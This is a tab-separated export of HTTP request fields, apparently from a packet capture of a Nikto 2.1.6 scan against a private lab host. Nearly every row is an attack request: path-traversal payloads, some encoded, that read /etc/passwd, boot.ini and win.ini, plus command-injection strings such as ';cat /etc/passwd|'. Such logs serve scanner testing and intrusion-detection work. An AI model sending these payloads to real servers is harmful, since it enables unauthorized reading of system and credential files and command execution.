http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									1779						1	http://192.168.1.101/web/postnuke/html/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003075)				/web/postnuke/html/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									1780						1	http://192.168.1.101/web/modules/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003075)				/web/modules/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									1781						1	http://192.168.1.101/web/phpBB/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003075)				/web/phpBB/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									1782						1	http://192.168.1.101/web/forum/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003075)				/web/forum/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									1783						1	http://192.168.1.101/web/GW5/GWWEB.EXE?HELP=bad-request		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003077)				/web/GW5/GWWEB.EXE?HELP=bad-request
																	Keep-Alive										192.168.1.101									1784						1	http://192.168.1.101/web/GWWEB.EXE?HELP=bad-request		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003078)				/web/GWWEB.EXE?HELP=bad-request
																	Keep-Alive										192.168.1.101									1785						1	http://192.168.1.101/web/scripts/tools/getdrvrs.exe		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003093)				/web/scripts/tools/getdrvrs.exe
																	Keep-Alive										192.168.1.101									1786						1	http://192.168.1.101/web/shop/normal_html.cgi?file=../../../../../../etc/issue%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003098)				/web/shop/normal_html.cgi?file=../../../../../../etc/issue%00
																	Keep-Alive										192.168.1.101									1787						1	http://192.168.1.101/web/shop/normal_html.cgi?file=;cat%20/etc/passwd|		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003099)				/web/shop/normal_html.cgi?file=;cat%20/etc/passwd|
																	Keep-Alive										192.168.1.101									1788						1	http://192.168.1.101/web/shop/normal_html.cgi?file=|cat%20/etc/passwd|		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003100)				/web/shop/normal_html.cgi?file=|cat%20/etc/passwd|
																	Keep-Alive										192.168.1.101									1789						1	http://192.168.1.101/web/shop/member_html.cgi?file=;cat%20/etc/passwd|		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003101)				/web/shop/member_html.cgi?file=;cat%20/etc/passwd|
																	Keep-Alive										192.168.1.101									1790						1	http://192.168.1.101/web/shop/member_html.cgi?file=|cat%20/etc/passwd|		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003102)				/web/shop/member_html.cgi?file=|cat%20/etc/passwd|
																	Keep-Alive										192.168.1.101									1791						1	http://192.168.1.101/web/boilerplate.asp?NFuse_Template=.../.../.../.../.../.../.../.../.../boot.ini&NFuse_CurrentFolder=/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003104)				/web/boilerplate.asp?NFuse_Template=.../.../.../.../.../.../.../.../.../boot.ini&NFuse_CurrentFolder=/
																	Keep-Alive										192.168.1.101									1792						1	http://192.168.1.101/web/?pattern=/etc/*&sort=name		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003120)				/web/?pattern=/etc/*&sort=name
																	Keep-Alive										192.168.1.101									1793						1	http://192.168.1.101/web/images/?pattern=/etc/*&sort=name		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003121)				/web/images/?pattern=/etc/*&sort=name
																	Keep-Alive										192.168.1.101									1795						1	http://192.168.1.101/web/3rdparty/phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003127)				/web/3rdparty/phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.101									1797						1	http://192.168.1.101/web/phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003127)				/web/phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.101									1798						1	http://192.168.1.101/web/3rdparty/phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003127)				/web/3rdparty/phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.101									1799						1	http://192.168.1.101/web/phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003127)				/web/phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.101									1800						1	http://192.168.1.101/web/pma/export.php?what=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003127)				/web/pma/export.php?what=../../../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.101									1801						1	http://192.168.1.101/web/dcforum/dcforum.cgi?az=list&forum=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003131)				/web/dcforum/dcforum.cgi?az=list&forum=../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.101									1802						1	http://192.168.1.101/web/internal.sws?../../../../../../../../winnt/win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003139)				/web/internal.sws?../../../../../../../../winnt/win.ini
																	Keep-Alive										192.168.1.101									1803						1	http://192.168.1.101/web/internal.sws?../../../../../../../../winnt/win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003140)				/web/internal.sws?../../../../../../../../winnt/win.ini
																	Keep-Alive										192.168.1.101									1804						1	http://192.168.1.101/web/internal.sws?.../.../.../.../.../.../.../.../winnt/win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003141)				/web/internal.sws?.../.../.../.../.../.../.../.../winnt/win.ini
																	Keep-Alive										192.168.1.101									1805						1	http://192.168.1.101/web/internal.sws?.../.../.../.../.../.../.../.../winnt/win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003142)				/web/internal.sws?.../.../.../.../.../.../.../.../winnt/win.ini
																	Keep-Alive										192.168.1.101									1806						1	http://192.168.1.101/web/viewimg.php?path=../../../../../../../../../../etc/passwd&form=1&var=1		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003154)				/web/viewimg.php?path=../../../../../../../../../../etc/passwd&form=1&var=1
																	Keep-Alive										192.168.1.101									1807						1	http://192.168.1.101/web/.../.../.../		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003179)				/web/.../.../.../
																	Keep-Alive										192.168.1.101									1808						1	http://192.168.1.101/web/Sites/Knowledge/Membership/Inspired/ViewCode.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003202)				/web/Sites/Knowledge/Membership/Inspired/ViewCode.asp
																	Keep-Alive										192.168.1.101									1809						1	http://192.168.1.101/web/Sites/Knowledge/Membership/Inspiredtutorial/ViewCode.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003203)				/web/Sites/Knowledge/Membership/Inspiredtutorial/ViewCode.asp
																	Keep-Alive										192.168.1.101									1810						1	http://192.168.1.101/web/Sites/Samples/Knowledge/Membership/Inspired/ViewCode.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003204)				/web/Sites/Samples/Knowledge/Membership/Inspired/ViewCode.asp
																	Keep-Alive										192.168.1.101									1811						1	http://192.168.1.101/web/Sites/Samples/Knowledge/Membership/Inspiredtutorial/ViewCode.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003205)				/web/Sites/Samples/Knowledge/Membership/Inspiredtutorial/ViewCode.asp
																	Keep-Alive										192.168.1.101									1812						1	http://192.168.1.101/web/Sites/Samples/Knowledge/Push/ViewCode.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003206)				/web/Sites/Samples/Knowledge/Push/ViewCode.asp
																	Keep-Alive										192.168.1.101									1813						1	http://192.168.1.101/web/Sites/Samples/Knowledge/Search/ViewCode.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003207)				/web/Sites/Samples/Knowledge/Search/ViewCode.asp
																	Keep-Alive										192.168.1.101									1814						1	http://192.168.1.101/web/SiteServer/Publishing/ViewCode.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003208)				/web/SiteServer/Publishing/ViewCode.asp
																	Keep-Alive										192.168.1.101									1815						1	http://192.168.1.101/web/siteserver/publishing/viewcode.asp?source=/default.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003209)				/web/siteserver/publishing/viewcode.asp?source=/default.asp
																	Keep-Alive										192.168.1.101									1816						1	http://192.168.1.101/web/shoutbox.php?conf=../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003210)				/web/shoutbox.php?conf=../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.101									1817						1	http://192.168.1.101/web/.%252e/.%252e/.%252e/winnt/boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003212)				/web/.%252e/.%252e/.%252e/winnt/boot.ini
																	Keep-Alive										192.168.1.101									1818						1	http://192.168.1.101/web/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003265)				/web/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									1819						1	http://192.168.1.101/web/postnuke/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003265)				/web/postnuke/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									1820						1	http://192.168.1.101/web/postnuke/html/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003265)				/web/postnuke/html/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									1821						1	http://192.168.1.101/web/modules/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003265)				/web/modules/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									1822						1	http://192.168.1.101/web/phpBB/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003265)				/web/phpBB/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									1823						1	http://192.168.1.101/web/forum/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003265)				/web/forum/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									1824						1	http://192.168.1.101/web/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/jabber/comment2.jse+/system/autoexec.ncf		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003266)				/web/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/jabber/comment2.jse+/system/autoexec.ncf
																	Keep-Alive										192.168.1.101									1825						1	http://192.168.1.101/web/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003267)				/web/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf
																	Keep-Alive										192.168.1.101									1826						1	http://192.168.1.101/web/opendir.php?/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003272)				/web/opendir.php?/etc/passwd
																	Keep-Alive										192.168.1.101									1827						1	http://192.168.1.101/web/opendir.php?requesturl=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003273)				/web/opendir.php?requesturl=/etc/passwd
																	Keep-Alive										192.168.1.101									1828						1	http://192.168.1.101/web/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003312)				/web/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1
																	Keep-Alive										192.168.1.101									1829						1	http://192.168.1.101/web/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003313)				/web/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1
																	Keep-Alive										192.168.1.101									1830						1	http://192.168.1.101/web/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003326)				/web/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini
																	Keep-Alive										192.168.1.101									1831						1	http://192.168.1.101/web/..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003327)				/web/..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini
																	Keep-Alive										192.168.1.101									1832						1	http://192.168.1.101/web/gallery/index.php?include=../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003345)				/web/gallery/index.php?include=../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.101									1833						1	http://192.168.1.101/web/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003346)				/web/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.101									1834						1	http://192.168.1.101/web/phprocketaddin/?page=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003350)				/web/phprocketaddin/?page=../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.101									1835						1	http://192.168.1.101/web/msadc/Samples/selector/showcode.asp?source=/msadc/Samples/../../../../../../../../../winnt/win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003354)				/web/msadc/Samples/selector/showcode.asp?source=/msadc/Samples/../../../../../../../../../winnt/win.ini
																	Keep-Alive										192.168.1.101									1836						1	http://192.168.1.101/web/pls/sample/admin_/help/..%255cplsql.conf		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003359)				/web/pls/sample/admin_/help/..%255cplsql.conf
